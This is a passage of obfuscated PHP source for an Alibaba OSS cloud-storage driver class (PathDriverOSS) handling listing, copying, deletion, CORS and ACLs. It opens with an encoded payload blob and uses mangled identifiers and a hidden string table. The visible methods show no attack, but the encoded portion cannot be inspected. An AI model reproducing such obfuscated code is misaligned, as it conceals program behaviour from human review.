102\1\75\27\221\212\223\225\37\46\314\220\250\136\211\300\112\347\20\113\162\136\21\301\270\36\323\61\370"."\322\126\307\73\6\51\343\162\244\243\71\125\120\203\35\123\144\151\162\145\244\231\313\341\53\356\11\242\251\136\266\264\61\127\246\20\322\75\332\40\162\364\26\13\207\2\363\104\124\105\343\2\316\50\232"."\136\167\215\233\234\301\75\246\64\207\343\61\153\31\76\154\330\351\254\44\47\250\214\254\204\227\52\246\31\32\120\275\37\356\326\262\131\166\153\105\211\102\52\332\43\251\154\45\315\52\171\150\213\252\146"."\xa3\x51\x38\xa7\x38\xa2\x39\xf2\x4e\x30\x4\x38\x2f\x8d\xc2\x79\x2b\xa2\x59\xe6\x8a\x71\x25\xf9\x6c\xad\x6c\x4d\xd0\xbd\xca\xc1\x3\x11\x68\xa6\x4a\x87\x85\x68\x51\x4a\x3a\xd1\x78\x56\x4d\x5c\x59\x1d\xac\x1\x77\x6a\x22"."\x68\xab\xde\xa\x49\x12\xe9\x54\xa9\xa9\xd6\x8a\xaa\x89\x27\x6c\x85\x3b\xb5\xe0\x83\xf0\x81\xbc\x5a\x4c\xd5\x5\xa\xea\x23\x55\x76\xc\x16\x53\x65\x8f\xa0\xf4\x6f\x42\xc5\x34\xa1\xb7\x55\xb9\x59\x89\xb8\x2a\xaa\x63\xe0"."\x23\xcc\xe5\x7c\xac\x4a\xb4\xac\x87\x56\x5d\x53\x2d\x5e\x95\xbe\x59\x4e\x6d\x32\x17\xdc\xf1\x74\x1\x25\x49\x34\x50\xd2\x7\x65\x43\x66\xae\x4c\x29\x4a\x42\xc\x63\xce\x18\x10\x5a\xbb\xcc\xdc\x68\x8a\x63\x7b\x2b\x17\x6".strrev('¶ù	ÎqÏx]Ì*Ê¤ªƒ¢oôôb¦ÈROc•<R­°y<ª{—¥”(:ç'."\0".'¢¤7›SB32ß&'."\n".'')."\xfb\x16\x42\x8\xf4\x1c\x5a\x50\xd5\x44\xf6\x18\x44\x3f\x7d\xe2\x8a\x8e\x96\x27\xf1\x68\x2\x41\x1c\x6\x89\x94\x33\x82\xcb\x4b\xaa\xff\x10\xc4\xca\x37\xfc\xde\x9b\xdc\x41\x50\x4e\x82\x46\x27\xcc\x92\xed\xa1\xba\xf9\x45"."\362\333\142\332\266\120\33\142\67\42\350\34\200\331\1\217\244\35\207\276\304\205\67\156\24\271\67\45\70\114\357\64\360\47\150\142\140\31\124\102\247\261\204\350\71\2\370\206\226\7\342\225\27\264\155"."\xfc\xed\x94\x1\x33\x93\x32\x47\x98\x4b\x68\x84\x39\xd2\x98\x48\x5e\x30\xc1\x73\xa4\xa4\xbf\x47\x5c\xe0\x58\x7e\x1a\xe3\x87\x37\x24\xbd\xe4\x36\xc5\xb\x4e\x8a\x57\x17\xfb\x1d\xd9\xe9\xcb\xde\x5c\xe7\xfe\xcb\x4a\x80\x9b"."\4\121\4\175\100\216\110\216\301\10\62\221\114\124\104\165\6\22\211\345\261\170\53\175\157\256\42\232\344\222\24\43\53\242\72\333\143\321\211\342\102\35\201\160\244\42\16\353\120\106\125\341\127\234\106"."\x85\x3b\x49\x2b\x89\x6a\xc1\x44\xad\x8\x7\x97\x8a\x96\xb0\x4b\xcd\x8\x3c\x4c\x2e\x26\x41\xba\xd9\x2b\x66\xcd\xc2\x44\xf3\xc8\xa\x48\x68\xcc\x73\xa3\x7c\xc9\xa5\xe7\x85\x33\x7a\x51\x88\x53\x0\x27\x5f\x84\x59\xec\xa9"."\33\376\341\174\44\332\245\260\354\124\324\141\230\13\305\142\135\311\50\324\24\57\2\24\77\332\307\11\0\77\117\10\225\35\237\103\133\110\202\223\105\102\250\216\264\166\345\335\235\334\12\163\271\34\211"."\x9e\x5a\x75\x34\xab\xdc\x50\xca\xca\x50\x38\x56\xc\xe\x6e\xe6\xa9\xec\xd5\x9d\xd5\x66\x4a\x1c\xe1\xe0\x6c\x7\x4e\xf\x60\xb8\x25\xed\x58\xfa\xed\x88\xb6\xb5\x7e\x26\x36\x75\xe8\xc1\x50\x69\x3a\x26\xa\x42\xce\xfd\xff".base64_decode('AFJYLwGBxQAA'), 10, -8))); goto BÊ‡š†á®Â; bŸ”ğå…µÄ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($«»ÂË”) { parent::__construct(); include_once SDK_DIR . $_SERVER[ŒÅŸ‹ä†][1614]; $this->_init($«»ÂË”); } public function _init($ıô‹×ùµ) { $Ì’›şÚİ =& $_SERVER[ŒÅŸ‹ä†]; $this->config = $ıô‹×ùµ; foreach ($ıô‹×ùµ as $È¨—œÅû => $…ëŒ÷½Ô) { if (isset($this->{$È¨—œÅû})) { $this->{$È¨—œÅû} = $…ëŒ÷½Ô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ì’›şÚİ[1615] . LNG($Ì’›şÚİ[1616])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¤ÜÜÄÀ¹ =& $_SERVER[ŒÅŸ‹ä†]; $¶Ì‡ïò = new OSS\Model\CorsConfig(); $Õ¾¨¨ = new OSS\Model\CorsRule(); $Õ¾¨¨->addAllowedOrigin($¤ÜÜÄÀ¹[1617]); $Õ¾¨¨->addAllowedMethod($¤ÜÜÄÀ¹[1618]); $Õ¾¨¨->addAllowedMethod($¤ÜÜÄÀ¹[1619]); $Õ¾¨¨->addAllowedMethod($¤ÜÜÄÀ¹[1620]); $Õ¾¨¨->addAllowedMethod($¤ÜÜÄÀ¹[1621]); $Õ¾¨¨->addAllowedMethod($¤ÜÜÄÀ¹[173]); $Õ¾¨¨->setMaxAgeSeconds(600); $Õ¾¨¨->addExposeHeader($¤ÜÜÄÀ¹[1622]); $Õ¾¨¨->addAllowedHeader($¤ÜÜÄÀ¹[1617]); $¶Ì‡ïò->addRule($Õ¾¨¨); try { $this->client->putBucketCors($this->bucket, $¶Ì‡ïò); } catch (OSS\Core\OssException $ş¥²¯Äå) { $this->writeLog(__FUNCTION__ . $¤ÜÜÄÀ¹[223] . $ş¥²¯Äå->getMessage()); return !1; } return !0; } public function getBucketCors() { $¹ß©ÖÏ =& $_SERVER[ŒÅŸ‹ä†]; $Ø®½Ûª© = null; try { $Ø®½Ûª© = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ç¶¬óºÅ) { $this->writeLog(__FUNCTION__ . $¹ß©ÖÏ[223] . $Ç¶¬óºÅ->getMessage()); return null; } if (!$Ø®½Ûª© || !($ÔëìòÚ = $Ø®½Ûª©->getRules())) { return null; } $ëƒ¨ëçÔ = $ÔëìòÚ[0]->getAllowedOrigins(); $¨ƒ§ùŒı = $ÔëìòÚ[0]->getAllowedMethods(); $Ó¯æ®‹ = $ÔëìòÚ[0]->getMaxAgeSeconds(); $½Ï ¸ŒÄ = $ÔëìòÚ[0]->getExposeHeaders(); $•¸—È¾ê = $ÔëìòÚ[0]->getAllowedHeaders(); return array($¹ß©ÖÏ[229] => isset($ëƒ¨ëçÔ[0]) ? $ëƒ¨ëçÔ[0] : $¹ß©ÖÏ[12], $¹ß©ÖÏ[233] => $¨ƒ§ùŒı, $¹ß©ÖÏ[1623] => $Ó¯æ®‹, $¹ß©ÖÏ[1624] => isset($½Ï ¸ŒÄ[0]) ? $½Ï ¸ŒÄ[0] : $¹ß©ÖÏ[12], $¹ß©ÖÏ[230] => isset($•¸—È¾ê[0]) ? $•¸—È¾ê[0] : $¹ß©ÖÏ[12]); } public function isBucketCors() { $ˆĞöşŒ =& $_SERVER[ŒÅŸ‹ä†]; $ŠÊ’âô– = $this->getBucketCors(); if (!$ŠÊ’âô– || !is_array($ŠÊ’âô–)) { return !1; } if ($ŠÊ’âô–[$ˆĞöşŒ[229]] != $ˆĞöşŒ[231] || $ŠÊ’âô–[$ˆĞöşŒ[230]] != $ˆĞöşŒ[231]) { return !1; } $¡œÕùß = array_map($ˆĞöşŒ[232], $ŠÊ’âô–[$ˆĞöşŒ[233]]); if (!is_array($¡œÕùß)) { $¡œÕùß = array(); } $íÉÀ©¯§ = array($ˆĞöşŒ[234], $ˆĞöşŒ[235], $ˆĞöşŒ[236], $ˆĞöşŒ[237], $ˆĞöşŒ[238]); $É¶í´÷ñ = array_diff($íÉÀ©¯§, $¡œÕùß); return empty($É¶í´÷ñ); } public function mkfile($ â¯é²ù, $í €Ş = '', $ÄŞ Ù¯™ = REPEAT_RENAME) { $ÀúÚÉãä = $this->setContent($ â¯é²ù, $í €Ş); if ($ÀúÚÉãä !== !1) { return $this->getPathOuter($ â¯é²ù); } return !1; } public function mkdir($ı²­ÈÒ‰, $„‰®æÎ = REPEAT_SKIP) { if ($„‰®æÎ && $this->_isFolder($ı²­ÈÒ‰)) { return $this->getPathOuter($ı²­ÈÒ‰); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ı²­ÈÒ‰)); } catch (OSS\Core\OssException $×İ«¾‘) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][223] . $×İ«¾‘->getMessage()); return !1; } return $this->getPathOuter($ı²­ÈÒ‰); } private function fileList($Â¹À´Ûœ, $ÒÁÑüó = '', $ç›İ°•Á = 0) { $èİÏß¸ =& $_SERVER[ŒÅŸ‹ä†]; $Â¹À´Ûœ = trim($Â¹À´Ûœ, $èİÏß¸[8]); $ÃĞı­ıñ = empty($Â¹À´Ûœ) && $Â¹À´Ûœ !== $èİÏß¸[239] ? $èİÏß¸[12] : $Â¹À´Ûœ . $èİÏß¸[8]; $Ã«òá¤– = $èİÏß¸[12]; $èÌÁî×ß = 1000; $ ¢Â¬„‹ = $®½²¾éÂ = array(); while (!0) { check_abort(); $Ãå’Ã®Í = array($èİÏß¸[1625] => $ÒÁÑüó, $èİÏß¸[1626] => $ÃĞı­ıñ, $èİÏß¸[1627] => $èÌÁî×ß, $èİÏß¸[1628] => $Ã«òá¤–); try { $­‰Ïı¹Û = $this->client->listObjects($this->bucket, $Ãå’Ã®Í); } catch (OSS\Core\OssException $åÎˆùÅŸ) { $this->writeLog(__FUNCTION__ . $èİÏß¸[223] . $åÎˆùÅŸ->getMessage()); break; } $Ã«òá¤– = $­‰Ïı¹Û->getNextMarker(); $£¼šÇù¨ = $­‰Ïı¹Û->getObjectList(); $šÄ”ŒÄÁ = $­‰Ïı¹Û->getPrefixList(); foreach ($£¼šÇù¨ as $şøªÙ ²) { if ($şøªÙ ²->getKey() == $ÃĞı­ıñ) { continue; } $ê·îÆÔô = $şøªÙ ²->getKey(); $ñıó¢Åü = $şøªÙ ²->getSize(); $Ø‚°¹äƒ = $şøªÙ ²->getLastModified(); $¨ÃÂÀÎ¬ = trim($şøªÙ ²->getETag(), $èİÏß¸[129]); $šƒ«½¹ = $ç›İ°•Á ? array($èİÏß¸[42] => $ê·îÆÔô, $èİÏß¸[89] => $ñıó¢Åü, $èİÏß¸[215] => strtotime($Ø‚°¹äƒ), $èİÏß¸[1629] => $¨ÃÂÀÎ¬) : $ê·îÆÔô; $ì¬­ãéÂ = $ñıó¢Åü == 0 && substr($ê·îÆÔô, strlen($ê·îÆÔô) - 1, 1) == $èİÏß¸[8] ? !0 : !1; $ûÇúÛõí = array($èİÏß¸[89] => $ñıó¢Åü, $èİÏß¸[1630] => $ñıó¢Åü, $èİÏß¸[98] => strtotime($Ø‚°¹äƒ), $èİÏß¸[1631] => $Ø‚°¹äƒ, $èİÏß¸[1629] => $¨ÃÂÀÎ¬); $this->cacheMethodInfoSet($ê·îÆÔô, $ì¬­ãéÂ, $ûÇúÛõí); if ($ì¬­ãéÂ) { $ ¢Â¬„‹[] = $ê·îÆÔô; continue; } $®½²¾éÂ[] = $šƒ«½¹; } foreach ($šÄ”ŒÄÁ as $ÈÄŸ–Íë) { $ ¢Â¬„‹[] = $ÈÄŸ–Íë->getPrefix(); $this->cacheMethodInfoSet($ÈÄŸ–Íë->getPrefix(), !0); } if ($Ã«òá¤– === $èİÏß¸[12]) { break; } } $this->cacheMethodInfoSet($Â¹À´Ûœ, !0); return array($èİÏß¸[95] => $ ¢Â¬„‹, $èİÏß¸[96] => $®½²¾éÂ); } public function listObject($«³ãßÅ¡, $ë¡Œ‰ĞÓ = '') { $Š Æ£œÎ =& $_SERVER[ŒÅŸ‹ä†]; $«³ãßÅ¡ = trim($«³ãßÅ¡, $Š Æ£œÎ[8]); $±û†Ë¨÷ = empty($«³ãßÅ¡) && $«³ãßÅ¡ !== $Š Æ£œÎ[239] ? $Š Æ£œÎ[12] : $«³ãßÅ¡ . $Š Æ£œÎ[8]; $‹•ÅÌÅ = $Š Æ£œÎ[12]; $È‡ùÎĞÙ = 1000; $‚·ÉÏ¾Œ = $í­ñÑÕŠ = array(); while (!0) { check_abort(); $¡â…ó­´ = array($Š Æ£œÎ[1625] => $ë¡Œ‰ĞÓ, $Š Æ£œÎ[1626] => $±û†Ë¨÷, $Š Æ£œÎ[1627] => $È‡ùÎĞÙ, $Š Æ£œÎ[1628] => $‹•ÅÌÅ); try { $ÄäŞÇÚ = $this->client->listObjects($this->bucket, $¡â…ó­´); } catch (OSS\Core\OssException $©»‘şØ) { $this->writeLog(__FUNCTION__ . $Š Æ£œÎ[223] . $©»‘şØ->getMessage()); break; } $‹•ÅÌÅ = $ÄäŞÇÚ->getNextMarker(); $æÂ¨ıÆÛ = $ÄäŞÇÚ->getObjectList(); foreach ($æÂ¨ıÆÛ as $åôùÊï) { if ($åôùÊï->getKey() == $±û†Ë¨÷) { continue; } $±–¢†¨û = $åôùÊï->getKey(); $¨÷ÌçŠİ = $åôùÊï->getSize(); $îã§‚Ùë = $¨÷ÌçŠİ == 0 && substr($±–¢†¨û, strlen($±–¢†¨û) - 1, 1) == $Š Æ£œÎ[8] ? !0 : !1; if ($îã§‚Ùë) { continue; } $í­ñÑÕŠ[] = $¨÷ÌçŠİ . $Š Æ£œÎ[223] . $±–¢†¨û; } if ($‹•ÅÌÅ === $Š Æ£œÎ[12]) { break; } } return array($Š Æ£œÎ[95] => $‚·ÉÏ¾Œ, $Š Æ£œÎ[96] => $í­ñÑÕŠ); } public function copyFile($‘±ôŞô¹, $äó¥çßÙ) { $›øÚìàÚ = $this->size($‘±ôŞô¹); if ($›øÚìàÚ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‘±ôŞô¹, $this->bucket, $this->pathEncode($äó¥çßÙ)); } catch (OSS\Core\OssException $şĞãñöç) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][223] . $şĞãñöç->getMessage()); return !1; } return $this->getPathOuter($äó¥çßÙ); } $½Ö±ŒÉ = $this->multiCopyObject($‘±ôŞô¹, $äó¥çßÙ, $›øÚìàÚ); return $½Ö±ŒÉ ? $this->getPathOuter($äó¥çßÙ) : !1; } private function multiCopyObject($ÃöïéŸ, $™îåÚòË, $×šÁ¤¨å) { $’†š‚í =& $_SERVER[ŒÅŸ‹ä†]; try { $Ìü™Ñ† = array(); if ($Ûä¾¸ÍÑ = $this->hashMd5($ÃöïéŸ)) { $Ìü™Ñ† = array(OSS\OssClient::OSS_HEADERS => array($’†š‚í[1632] => $Ûä¾¸ÍÑ)); } $šğ´ƒƒÒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($™îåÚòË), $Ìü™Ñ†); $‡Ì¯ßÕÈ = 1; $ÏÌ‰»îü = 0; $á·•Ñï„ = array(); $êÚ¿¢Œ¹ = 1024 * 1024 * 10; $º‘ƒ°ÜÁ = $this->client->generateMultiuploadParts($×šÁ¤¨å, $êÚ¿¢Œ¹); foreach ($º‘ƒ°ÜÁ as $Ù¿Îí => $¥îÇ¶úÄ) { $Åºş¾´ = $ÏÌ‰»îü + (int) $¥îÇ¶úÄ[$’†š‚í[1633]]; $ïâ·ô = (int) $¥îÇ¶úÄ[$’†š‚í[422]] + $Åºş¾´ - 1; $éÒâú‡ = array($’†š‚í[175] => $Åºş¾´, $’†š‚í[176] => $ïâ·ô); $á·•Ñï„[] = $this->client->uploadPartCopy($this->bucket, $ÃöïéŸ, $this->bucket, $this->pathEncode($™îåÚòË), $‡Ì¯ßÕÈ, $šğ´ƒƒÒ, $éÒâú‡); $‡Ì¯ßÕÈ = $‡Ì¯ßÕÈ + 1; } $‹¢½ÄÒ¼ = array(); foreach ($á·•Ñï„ as $Ù¿Îí => $ÚİÒŠÓÃ) { $‹¢½ÄÒ¼[] = array($’†š‚í[307] => $Ù¿Îí + 1, $’†š‚í[308] => $ÚİÒŠÓÃ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($™îåÚòË), $šğ´ƒƒÒ, $‹¢½ÄÒ¼); } catch (OSS\Core\OssException $²›ÆÒ¤Œ) { $this->writeLog(__FUNCTION__ . $’†š‚í[223] . $²›ÆÒ¤Œ->getMessage()); return !1; } return !0; } public function moveFile($äƒŸ“„, $ëÂÖ÷ŞŠ) { if ($this->copyFile($äƒŸ“„, $ëÂÖ÷ŞŠ)) { $this->remove($äƒŸ“„); return $this->getPathOuter($ëÂÖ÷ŞŠ); } return !1; } public function delFile($™¹ŒİÑ†) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($™¹ŒİÑ†)); } catch (OSS\Core\OssException $ºÙÍ¦ÈÏ) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][223] . $ºÙÍ¦ÈÏ->getMessage()); return !1; } return !0; } public function delFolder($‡øáœ¼) { $¯’ÓÁòœ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->exist($‡øáœ¼)) { return !0; } $this->listItemCache = !1; $»¨áÒà = $this->fileList($‡øáœ¼); $this->listItemCache = !0; $¼éÖœ»ß = trim($‡øáœ¼, $¯’ÓÁòœ[8]) . $¯’ÓÁòœ[8]; if (!empty($‡øáœ¼) && $‡øáœ¼ !== $¯’ÓÁòœ[239] && !in_array($¼éÖœ»ß, $»¨áÒà[$¯’ÓÁòœ[95]])) { $»¨áÒà[$¯’ÓÁòœ[95]][] = $¼éÖœ»ß; } $š†œ–ä€ = $this->delByBatch($»¨áÒà[$¯’ÓÁòœ[96]]); if (!$š†œ–ä€) { return !1; } $š†œ–ä€ = $this->delByBatch($»¨áÒà[$¯’ÓÁòœ[95]]); if (!$š†œ–ä€) { return !1; } return $this->delFile($¼éÖœ»ß); } private function delByBatch($Ù¹ú§Ï£) { foreach (array_chunk($Ù¹ú§Ï£, 1000) as $Ñá“½ã) { try { $this->client->deleteObjects($this->bucket, $Ñá“½ã); } catch (OSS\Core\OssException $Û¿“×ò¬) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][223] . $Û¿“×ò¬->getMessage()); return !1; } } return !0; } public function rename($­œ‚Ø¿‚, $‚ØöË³) { return $this->renameObject($­œ‚Ø¿‚, $‚ØöË³); } private function fileInfo($€·˜ÛåÍ, $÷•ª Ø = false, $Ã‚ÁÆ™¡ = array()) { $’ºß«› =& $_SERVER[ŒÅŸ‹ä†]; $³¢î™“ = array($’ºß«›[42] => $this->pathThis($€·˜ÛåÍ), $’ºß«›[97] => $this->getPathOuter($€·˜ÛåÍ), $’ºß«›[43] => $’ºß«›[241], $’ºß«›[89] => isset($Ã‚ÁÆ™¡[$’ºß«›[89]]) ? $Ã‚ÁÆ™¡[$’ºß«›[89]] : 0, $’ºß«›[177] => $this->ext($€·˜ÛåÍ)); if ($÷•ª Ø) { return $³¢î™“; } $³¢î™“[$’ºß«›[242]] = $³¢î™“[$’ºß«›[98]] = 0; $³¢î™“[$’ºß«›[243]] = $³¢î™“[$’ºß«›[244]] = !0; if (empty($Ã‚ÁÆ™¡)) { $ñĞº¬µø = $this->objectMeta($€·˜ÛåÍ); if (!$ñĞº¬µø) { return $³¢î™“; } $Ã‚ÁÆ™¡ = array($’ºß«›[98] => strtotime($ñĞº¬µø[$’ºß«›[1631]]), $’ºß«›[89] => $ñĞº¬µø[$’ºß«›[1630]] + 0, $’ºß«›[1629] => $ñĞº¬µø[$’ºß«›[1629]]); } if (isset($Ã‚ÁÆ™¡[$’ºß«›[1629]]) && $Ã‚ÁÆ™¡[$’ºß«›[1629]]) { $³¢î™“[$’ºß«›[246]] = trim($Ã‚ÁÆ™¡[$’ºß«›[1629]], $’ºß«›[129]); } if (isset($Ã‚ÁÆ™¡[$’ºß«›[89]])) { $³¢î™“[$’ºß«›[89]] = $Ã‚ÁÆ™¡[$’ºß«›[89]]; } if (isset($Ã‚ÁÆ™¡[$’ºß«›[98]])) { $³¢î™“[$’ºß«›[98]] = $Ã‚ÁÆ™¡[$’ºß«›[98]]; } if (isset($Ã‚ÁÆ™¡[$’ºß«›[215]]) && !trim($³¢î™“[$’ºß«›[98]])) { $³¢î™“[$’ºß«›[98]] = $Ã‚ÁÆ™¡[$’ºß«›[215]]; } return $³¢î™“; } private function folderInfo($Ò§ÃËºé, $õßÛôÔ = false, $ÒÅªğÖÄ = array()) { $¶¦‰ˆĞ =& $_SERVER[ŒÅŸ‹ä†]; $½‹ŒÁÓ = array($¶¦‰ˆĞ[42] => $this->pathThis($Ò§ÃËºé), $¶¦‰ˆĞ[97] => $this->getPathOuter($¶¦‰ˆĞ[8] . $Ò§ÃËºé), $¶¦‰ˆĞ[43] => $¶¦‰ˆĞ[88]); if ($õßÛôÔ) { return $½‹ŒÁÓ; } $½‹ŒÁÓ[$¶¦‰ˆĞ[242]] = $½‹ŒÁÓ[$¶¦‰ˆĞ[98]] = 0; $½‹ŒÁÓ[$¶¦‰ˆĞ[243]] = $½‹ŒÁÓ[$¶¦‰ˆĞ[244]] = !0; if (empty($ÒÅªğÖÄ)) { $Ò§ÃËºé = rtrim($Ò§ÃËºé, $¶¦‰ˆĞ[8]) . $¶¦‰ˆĞ[8]; $˜ïêÚ‡ô = $this->objectMeta($Ò§ÃËºé); if (!$˜ïêÚ‡ô) { return $½‹ŒÁÓ; } $ÒÅªğÖÄ = array($¶¦‰ˆĞ[242] => $˜ïêÚ‡ô[$¶¦‰ˆĞ[600]][$¶¦‰ˆĞ[1634]], $¶¦‰ˆĞ[98] => strtotime($˜ïêÚ‡ô[$¶¦‰ˆĞ[1631]])); } if (isset($ÒÅªğÖÄ[$¶¦‰ˆĞ[98]])) { $½‹ŒÁÓ[$¶¦‰ˆĞ[98]] = $ÒÅªğÖÄ[$¶¦‰ˆĞ[98]]; } if (isset($ÒÅªğÖÄ[$¶¦‰ˆĞ[242]])) { $½‹ŒÁÓ[$¶¦‰ˆĞ[242]] = $ÒÅªğÖÄ[$¶¦‰ˆĞ[242]]; } return $½‹ŒÁÓ; } public function listPath($ì¥‡¹˜ƒ, $Œœö¨ûş = false) { $Äİ‚ş³ =& $_SERVER[ŒÅŸ‹ä†]; $ÜİÖÑ˜ = $this->fileList($ì¥‡¹˜ƒ, $Äİ‚ş³[8], !0); foreach ($ÜİÖÑ˜[$Äİ‚ş³[95]] as $‰Ş–ëè => $Ïéıİö¯) { $ÜİÖÑ˜[$Äİ‚ş³[95]][$‰Ş–ëè] = $this->folderInfo($Ïéıİö¯, $Œœö¨ûş, $Ïéıİö¯); } foreach ($ÜİÖÑ˜[$Äİ‚ş³[96]] as $‰Ş–ëè => $Ïéıİö¯) { $ÜİÖÑ˜[$Äİ‚ş³[96]][$‰Ş–ëè] = $this->fileInfo($Ïéıİö¯[$Äİ‚ş³[42]], $Œœö¨ûş, $Ïéıİö¯); } return $ÜİÖÑ˜; } protected function infoChildren($Š²ğéâÓ, &$â âªÖô) { $ş Ç‘Ë– =& $_SERVER[ŒÅŸ‹ä†]; $ÏË•îĞª = $this->fileList($Š²ğéâÓ, $ş Ç‘Ë–[12], !0); $â âªÖô[$ş Ç‘Ë–[91]] += count($ÏË•îĞª[$ş Ç‘Ë–[95]]); $â âªÖô[$ş Ç‘Ë–[90]] += count($ÏË•îĞª[$ş Ç‘Ë–[96]]); foreach ($ÏË•îĞª[$ş Ç‘Ë–[96]] as $²æ»öŒÙ) { if (!$²æ»öŒÙ || !$²æ»öŒÙ[$ş Ç‘Ë–[89]]) { continue; } $â âªÖô[$ş Ç‘Ë–[89]] += $²æ»öŒÙ[$ş Ç‘Ë–[89]]; } } public function has($ÉÂÔÙôŸ, $½Ü¤‰±Å = false, $¦´©’µ­ = true) { $ÏÌ£šÊ™ =& $_SERVER[ŒÅŸ‹ä†]; $ÉÂÔÙôŸ = trim($ÉÂÔÙôŸ, $ÏÌ£šÊ™[8]); $®¥êÁŠË = empty($ÉÂÔÙôŸ) && $ÉÂÔÙôŸ !== $ÏÌ£šÊ™[239] ? $ÏÌ£šÊ™[12] : $ÉÂÔÙôŸ . $ÏÌ£šÊ™[8]; $Š¼ÄÀÑ = $ÏÌ£šÊ™[12]; $Ãâ¬ğ = 500; $÷ÂéÀŸ = $ï‰¹ÆÖ§ = 0; while (!0) { check_abort(); $„®øêœ£ = array($ÏÌ£šÊ™[1625] => $ÏÌ£šÊ™[8], $ÏÌ£šÊ™[1626] => $®¥êÁŠË, $ÏÌ£šÊ™[1627] => $Ãâ¬ğ, $ÏÌ£šÊ™[1628] => $Š¼ÄÀÑ); try { $Ÿš“Îêº = $this->client->listObjects($this->bucket, $„®øêœ£); } catch (OSS\Core\OssException $Ù÷ÅÙÈ) { $this->writeLog(__FUNCTION__ . $ÏÌ£šÊ™[223] . $Ù÷ÅÙÈ->getMessage()); break; } $Š¼ÄÀÑ = $Ÿš“Îêº->getNextMarker(); $±Ø„ûÂ‰ = $Ÿš“Îêº->getObjectList(); $Ğ¾ñüö“ = $Ÿš“Îêº->getPrefixList(); if ($½Ü¤‰±Å) { if (count($±Ø„ûÂ‰) > 1 || count($±Ø„ûÂ‰) == 1 && $±Ø„ûÂ‰[0]->getKey() != $®¥êÁŠË) { $÷ÂéÀŸ += count($±Ø„ûÂ‰) - 1; } if (!empty($Ğ¾ñüö“)) { $ï‰¹ÆÖ§ += count($Ğ¾ñüö“); } if ($Š¼ÄÀÑ === $ÏÌ£šÊ™[12]) { break; } continue; } if ($¦´©’µ­) { if (!empty($±Ø„ûÂ‰)) { if (count($±Ø„ûÂ‰) > 1 || $±Ø„ûÂ‰[0]->getKey() != $®¥êÁŠË) { return !0; } } } else { if (!empty($Ğ¾ñüö“)) { return !0; } } if ($Š¼ÄÀÑ === $ÏÌ£šÊ™[12]) { break; } } if ($½Ü¤‰±Å) { return array($ÏÌ£šÊ™[250] => $÷ÂéÀŸ, $ÏÌ£šÊ™[251] => $ï‰¹ÆÖ§); } return !1; } public function listAll($õÈäà˜¦) { $Å„í =& $_SERVER[ŒÅŸ‹ä†]; $Ì ½ˆ ™ = $this->fileList($õÈäà˜¦, $Å„í[12], !0); $íëšò† = array_to_keyvalue($Ì ½ˆ ™[$Å„í[96]], $Å„í[42]); foreach ($Ì ½ˆ ™[$Å„í[95]] as $…ç­ÒÉí) { if (is_string($…ç­ÒÉí)) { $íëšò†[$…ç­ÒÉí] = array($Å„í[89] => 0); } } return $this->listAllFiles($õÈäà˜¦, $íëšò†); } public function canRead($ÎØãÜ¦Ñ) { $‰¯ÛÄ¨Œ =& $_SERVER[ŒÅŸ‹ä†]; $ïşøö´ = $this->pathAcl($ÎØãÜ¦Ñ); return $ïşøö´ == $‰¯ÛÄ¨Œ[1635] || $ïşøö´ == $‰¯ÛÄ¨Œ[647] ? !0 : !1; } public function canWrite($¿ù–Í½¶) { $°¨ª˜— = $this->pathAcl($¿ù–Í½¶); return $°¨ª˜— == $_SERVER[ŒÅŸ‹ä†][647] ? !0 : !1; } public function pathAcl($¸ìéÆÕÚ) { $ÄÏÎ¼š¶ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ö­şœêƒ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¸ìéÆÕÚ)); } catch (OSS\Core\OssException $øÊ°ÒÓÛ) { $this->writeLog(__FUNCTION__ . $ÄÏÎ¼š¶[223] . $øÊ°ÒÓÛ->getMessage()); return !1; } $÷Å¦¨çñ = $Ö­şœêƒ == $ÄÏÎ¼š¶[47] ? $this->bucketAcl : $Ö­şœêƒ; if ($÷Å¦¨çñ == $ÄÏÎ¼š¶[1636]) { return $ÄÏÎ¼š¶[1635]; } if ($÷Å¦¨çñ == $ÄÏÎ¼š¶[1637]) { return $ÄÏÎ¼š¶[647]; } return $÷Å¦¨çñ; } private function chmodPath($Ç—¸£é‰, $àŒ¬²Í = '') { $¸èğ¬¾Ô =& $_SERVER[ŒÅŸ‹ä†]; $÷ˆû´±ƒ = empty($àŒ¬²Í) ? $¸èğ¬¾Ô[1637] : $àŒ¬²Í; $É—Öˆ¹Ø = array($¸èğ¬¾Ô[47], $¸èğ¬¾Ô[240], $¸èğ¬¾Ô[1636], $¸èğ¬¾Ô[1637]); if (!in_array($÷ˆû´±ƒ, $É—Öˆ¹Ø)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ç—¸£é‰), $÷ˆû´±ƒ); } catch (OSS\Core\OssException $…ÜŞÎÌ ) { $this->writeLog(__FUNCTION__ . $¸èğ¬¾Ô[223] . $…ÜŞÎÌ ->getMessage()); return !1; } return !0; } public function getContent($‰ÔÁíĞø) { return $this->fileSubstr($‰ÔÁíĞø, -1); } public function setContent($¤°˜æ, $ûÉŠƒƒ = '') { $¡Ç·×—ê =& $_SERVER[ŒÅŸ‹ä†]; try { $ÛÆÍ˜§× = $this->trafficLimit($¡Ç·×—ê[1638]); $ÚşÀ™Áë = $this->client->putObject($this->bucket, $this->pathEncode($¤°˜æ), 